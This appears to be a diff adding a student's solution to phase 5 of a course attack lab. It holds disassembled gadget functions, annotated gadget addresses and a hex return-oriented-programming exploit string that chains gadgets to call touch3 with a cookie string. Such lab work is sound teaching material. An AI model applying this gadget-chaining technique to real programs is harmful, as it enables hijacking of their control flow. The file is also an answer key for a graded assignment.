@@ -1,0 +1,71 @@
+0000000000421e22 <touch3>:
+  421e22:	53                   	push   %rbx
+  421e23:	48 89 fb             	mov    %rdi,%rbx
+  421e26:	c7 05 cc 36 20 00 03 	movl   $0x3,0x2036cc(%rip)        # 6254fc <vlevel>
+  421e2d:	00 00 00 
+  421e30:	48 89 fe             	mov    %rdi,%rsi
+  421e33:	8b 3d cb 36 20 00    	mov    0x2036cb(%rip),%edi        # 625504 <cookie>
+  421e39:	e8 66 ff ff ff       	callq  421da4 <hexmatch>
+  421e3e:	85 c0                	test   %eax,%eax
+  421e40:	74 1e                	je     421e60 <touch3+0x3e>
+  421e42:	48 89 de             	mov    %rbx,%rsi
+  421e45:	bf 98 37 42 00       	mov    $0x423798,%edi
+  421e4a:	b8 00 00 00 00       	mov    $0x0,%eax
+  421e4f:	e8 2c ee fd ff       	callq  400c80 <printf@plt>
+  421e54:	bf 03 00 00 00       	mov    $0x3,%edi
+  421e59:	e8 fb 03 00 00       	callq  422259 <validate>
+  421e5e:	eb 1c                	jmp    421e7c <touch3+0x5a>
+  421e60:	48 89 de             	mov    %rbx,%rsi
+  421e63:	bf c0 37 42 00       	mov    $0x4237c0,%edi
+  421e68:	b8 00 00 00 00       	mov    $0x0,%eax
+  421e6d:	e8 0e ee fd ff       	callq  400c80 <printf@plt>
+  421e72:	bf 03 00 00 00       	mov    $0x3,%edi
+  421e77:	e8 8f 04 00 00       	callq  42230b <fail>
+  421e7c:	bf 00 00 00 00       	mov    $0x0,%edi
+  421e81:	e8 6a ef fd ff       	callq  400df0 <exit@plt>
+
+
+0000000000421f27 <getval_312>:
+  421f27:	b8 48 89 e0 c3       	mov    $0xc3e08948,%eax
+  421f2c:	c3                   	retq   
+
+28 1f 42 00 00 00 00 00 # 421f28: 48 89 e0 (movq $rsp, $rax)
+
+
+0000000000421eec <add_xy>:
+  421eec:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  421ef0:	c3                   	retq   
+
+ef 1e 42 00 00 00 00 00 # 421eef: 04 37 (add $0x37, $al)
+
+
+0000000000421eb7 <addval_320>:
+  421eb7:	8d 87 48 89 c7 90    	lea    -0x6f3876b8(%rdi),%eax
+  421ebd:	c3                   	retq  
+
+b9 1e 42 00 00 00 00 00 # 421eb9: 48 89 c7 (movq $rax, $rdi)
+
+22 1e 42 00 00 00 00 00 # address <touch3> 0x421e22
+
+xx xx xx xx xx xx xx xx    # padding 24 bytes
+28 1f 42 00 00 00 00 00    # 421f28: 48 89 e0 (movq $rsp, $rax)
+ef 1e 42 00 00 00 00 00    # 421eef: 04 37 (add $0x37, $al)
+b9 1e 42 00 00 00 00 00    # 421eb9: 48 89 c7 (movq $rax, $rdi)
+22 1e 42 00 00 00 00 00 # address <touch3> 0x421e22
+xx xx xx xx xx xx xx xx    # padding 0x37 - 24 = 31 bytes
+36 38 65 32 64 39 39 61 00 # ascii of cookie 0x68e2d99a (string)
+
+61 61 61 61 61 61
+61 61 61 61 61 61
+61 61 61 61 61 61
+61 61 61 61 61 61
+28 1f 42 00 00 00 00 00 
+ef 1e 42 00 00 00 00 00
+b9 1e 42 00 00 00 00 00
+22 1e 42 00 00 00 00 00
+61 61 61 61 61 61
+61 61 61 61 61 61
+61 61 61 61 61 61
+61 61 61 61 61 61
+61 61 61 61 61 61 61
+36 38 65 32 64 39 39 61 00
